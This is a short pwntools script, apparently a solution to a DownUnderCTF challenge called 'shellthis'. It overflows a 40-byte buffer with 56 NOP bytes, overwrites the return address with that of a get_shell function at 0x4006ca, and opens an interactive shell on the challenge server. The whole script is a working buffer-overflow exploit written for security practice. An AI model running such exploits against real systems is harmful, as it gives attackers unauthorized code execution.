from pwn import *
shellcode = p64(0x00000000004006ca) 
#p = process('./shellthis')
p = remote('chal.duc.tf', 30002)
print(p.recvline(timeout=1).decode('utf-8'))
print(p.recv(40).decode('utf-8'))
# buffer overflow of 40 char buffer
# objdump -d shellthis:
# 00000000004006ca <get_shell>
p.sendline(b'\x90'*56+shellcode)
p.interactive()
p.close()
